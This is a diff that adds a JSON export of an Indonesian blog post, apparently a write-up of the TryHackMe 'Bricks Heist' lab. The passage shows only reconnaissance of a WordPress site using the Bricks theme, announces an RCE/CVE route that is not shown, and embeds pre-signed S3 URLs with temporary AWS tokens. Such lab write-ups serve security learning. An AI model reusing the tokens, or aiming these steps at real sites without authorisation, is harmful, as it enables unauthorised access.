@@ -1,0 +1,3892 @@
+{
+  "meta": {
+    "generated_at": "2025-09-18T12:54:11.630Z",
+    "notion_api_version": "2022-06-28",
+    "includes_content": true,
+    "folder": "tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2",
+    "slug": "tryhack3m-bricks-heist",
+    "og_image": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/featured-image.png",
+    "featured_image": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/featured-image.png"
+  },
+  "post": {
+    "id": "24adb469-a81d-807e-b9dd-c92c2292fde2",
+    "created_time": "2025-08-09T13:18:00.000Z",
+    "last_edited_time": "2025-09-18T10:33:00.000Z",
+    "url": "https://www.notion.so/TryHack3M-Bricks-Heist-24adb469a81d807eb9ddc92c2292fde2",
+    "public_url": null,
+    "archived": false,
+    "icon": null,
+    "cover": null,
+    "properties": {
+      "description": "",
+      "createdtime": {
+        "id": "Abyx",
+        "type": "created_time",
+        "created_time": "2025-08-09T13:18:00.000Z"
+      },
+      "slug": "tryhack3m:-bricks-heist",
+      "publisheddate": "2025-08-09",
+      "owner": [
+        {
+          "id": "ac3d6ce8-4cb1-4c2d-a068-480495e731ed"
+        }
+      ],
+      "featured_image": [
+        {
+          "type": "file",
+          "url": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/f3694fd4-dd3c-4c89-9834-7de4bdfc35c7/Green_Passive_Income_Ideas_YouTube_Thumbnail.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667I6D6R3I%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQCXsVeS2ls1Y2OGl5fUxNkUuAOzc5jToVGd7%2B6hJq9p%2FwIgax2ae2VrIWqZNSyPsUEiU3Q%2FLPR3c68Q7iU%2Fnrk%2FcBAqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKpO%2BYm3pdWK1DRMYircAzt3qJPGl62rnNXRMhtP5D8YnOEFYZ2LG15MpdI7%2FLPYhSnzanFlH%2BOOU3G8xKDZGeWwoOPjrkGPE4Ve6ZcNTNRIdAgJs%2Fchh0Wbf%2BUPksg6t799kMasegFXAwmZxgny9O8yA7b1a7O4Qj4JigqYH2KBjmZYFKA2YzH1hSAb8fErBrXEnDg13GydgsSxFdZPNCITlnbYts0kB5RWckcBr6d1Bbls9qxUREv0AWz6EcQ07%2FxQPkvIgFXj4yfn%2FNy0oSVh%2FIzJ61Xv2hdO2hmsTHCthPgUXxY9noIvc1CzM2IZh985Ju8nrQbX3Vesv7Q%2BO2aZLiA%2BDnDpkuN4HB0hkp62P7K7z9HVmQsTq6hfMEd8KvIAYtWQOu2FmiI520hxzB3N2RcCOY7jjpiu8EoQ73sLCgYGZj03DEwMsp7UgQ32YcS5%2FrL2bwGzD8zHBoQnBH4WfWt44EsV9r53AG0o8Dsd1e%2Fmwhxp%2BT8yR41rP%2BvMk%2FUB%2Fk43W7iFo0PTXHzOMFXyreCRGDuWt1PR3%2BehNaSdOmGxk%2F5dF6gbImQSnF56OFRSFAJkmgNhZ%2B7g1wWTzjrCmhiXhbF4uTXCS87qhnh404ddQkC%2B%2BxX2pVFOT9YXDgN3fPFI0uxw17ucMNLbr8YGOqUBwEN5ZrwPo8fMdgc5wSLBo7sf1f%2BM2%2FoaUmAhsYeMOl3JY2hJpsJNaQCghAY44LHzZKcoxne7hZ%2FaqzqXx9qOw7tiXDadyc8rVBvYG9iHpt%2FkZ3oGRyogu%2FSvg%2BfSTl9yWczQZtNDJCzPyJ0LWrJvPZom827jl0Jxy2RjFDrkP%2F4gRiNZi69zVE%2F%2FfGry%2BequCbfW1c8mSXeSL5i8%2FVpXhxitD3wV&X-Amz-Signature=475af4419ae82131f7173b6509bc2233f0e8a5f5fcd65840b5667a64409f229f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+          "name": "Green Passive Income Ideas YouTube Thumbnail.png",
+          "expiry_time": "2025-09-18T13:53:32.390Z"
+        }
+      ],
+      "tags": [
+        "Web Exploit",
+        "Forensics"
+      ],
+      "published": true,
+      "title": "TryHack3M: Bricks Heist"
+    },
+    "title": "TryHack3M: Bricks Heist",
+    "content": [
+      {
+        "id": "24adb469-a81d-80a4-8ce7-f3f143ac84e7",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:19:00.000Z",
+        "last_edited_time": "2025-08-09T13:19:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Link Room: ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "https://tryhackme.com/room/tryhack3mbricksheist",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": "https://tryhackme.com/room/tryhack3mbricksheist"
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80cf-b940-d9494c295958",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:34:00.000Z",
+        "last_edited_time": "2025-08-09T13:34:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-804f-87bc-f385d3f09428",
+        "type": "image",
+        "created_time": "2025-08-09T13:34:00.000Z",
+        "last_edited_time": "2025-08-09T13:34:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-1.png",
+          "expiry_time": "2025-09-18T13:53:33.787Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-1.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/4bd8411b-8453-4297-9470-b14d84cb9a87/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=09c166e1c18ef104c4ff4c557cf7fdd9e0ef11190d065599f9491b90631d74c9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-809a-b3d4-f8e7cf5d3eaf",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:32:00.000Z",
+        "last_edited_time": "2025-08-09T13:32:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-806e-a8ec-e8b495df84f6",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:32:00.000Z",
+        "last_edited_time": "2025-08-09T13:34:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Oke sebelum kita mulai, mulai dibiasakan baca deskripsi lab nya terlebih dahulu, seperti pada gambar diatas. Pada deskripsi nya menjelaskan untuk menyelesaikan soal ini cukup dari RCE dan juga CVE sebagai kunci nya.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80da-84cf-f12ff8fbedce",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:34:00.000Z",
+        "last_edited_time": "2025-08-09T13:34:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80dd-8448-ed489235f78d",
+        "type": "image",
+        "created_time": "2025-08-09T13:32:00.000Z",
+        "last_edited_time": "2025-08-09T13:34:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-2.png",
+          "expiry_time": "2025-09-18T13:53:33.795Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-2.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/e64d5c09-0a43-4823-8f9a-546081ec8486/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=4f72a69041d420ab432b1c2d09a6804f7dd69715ed367f78e8b59ad2d7eed9bf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8078-906f-c5a158129c30",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:32:00.000Z",
+        "last_edited_time": "2025-08-09T13:35:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Selanjutnya kita masukan ip lab ke dalam file /etc/hosts. Sehingga kita akan menggunakan domain ‘bricks.thm’.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80ef-99ad-c3907d8a7506",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:35:00.000Z",
+        "last_edited_time": "2025-08-09T13:35:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80be-86c7-c37dce29953f",
+        "type": "heading_2",
+        "created_time": "2025-08-09T13:35:00.000Z",
+        "last_edited_time": "2025-08-09T13:35:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tahap 1",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24adb469-a81d-801a-b5d0-d90c580d2964",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:35:00.000Z",
+        "last_edited_time": "2025-08-09T13:36:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Setelah configurasi. Saya langsung mencoba mengakses website nya yang beralamat ‘bricks.thm’. Dan hasilnya seperti pada gambar berikut:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80f6-9ca7-e6d819657cea",
+        "type": "image",
+        "created_time": "2025-08-09T13:36:00.000Z",
+        "last_edited_time": "2025-08-09T13:36:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-3.png",
+          "expiry_time": "2025-09-18T13:53:33.787Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-3.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/6013e9e3-1d3f-4d3d-8d87-a9b80bb41319/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=ccb47d96d4520293fa6accbc1d495fb7262611248e8ba045f4a0e262485884cd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80ce-95cc-f779472b1daf",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:36:00.000Z",
+        "last_edited_time": "2025-08-09T13:37:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada gambar tersebut merupakan tampilan awal dari website target. Isi nya hanya menampilkan sebuah gambar tembok saja.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80d9-a966-c4f4570b4de0",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:37:00.000Z",
+        "last_edited_time": "2025-08-09T13:37:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Saya coba cek dengan ektensi wappalyzer untuk mengetahui teknologi apa yang digunakan. Berikut hasilnya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80df-a071-e7b6d1b3ed50",
+        "type": "image",
+        "created_time": "2025-08-09T13:37:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-4.png",
+          "expiry_time": "2025-09-18T13:53:33.781Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-4.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/62188ff2-2add-4c72-8e08-d1bde64b8d95/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=6faeca376d4720035073c8da4fa869ffeee4f802afdac1d69da2a4f28b3e061d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80bc-87fb-dfaa5c35166e",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:37:00.000Z",
+        "last_edited_time": "2025-08-09T13:38:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada gambar tersebut bahwa teknologi yang digunakan adalah menggunakan CMS Wordpress. Lanjut saya cek juga source code nya seperti berikut:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8016-a78e-d5d08da45981",
+        "type": "image",
+        "created_time": "2025-08-09T13:38:00.000Z",
+        "last_edited_time": "2025-08-09T13:38:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-5.png",
+          "expiry_time": "2025-09-18T13:53:33.792Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-5.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/85555038-7b17-44de-861d-0b41006ed796/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=cabae0c3c0ca3c1f63716b514e458fa93bf5acd65d69d4edbb7b6a8d9154a76b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80ca-ab6e-f7233f0fbf7d",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:38:00.000Z",
+        "last_edited_time": "2025-08-09T13:39:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada gambar diatas, terlihat jelas bahwa website target menggunakan theme dari bricks:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8018-a167-fb0e410d7299",
+        "type": "code",
+        "created_time": "2025-08-09T13:39:00.000Z",
+        "last_edited_time": "2025-08-09T13:40:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "https://bricks.thm/",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "wp-content/themes/bricks",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "blue"
+              },
+              "href": null
+            },
+            {
+              "content": "/assets/css/frontend.min.css",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
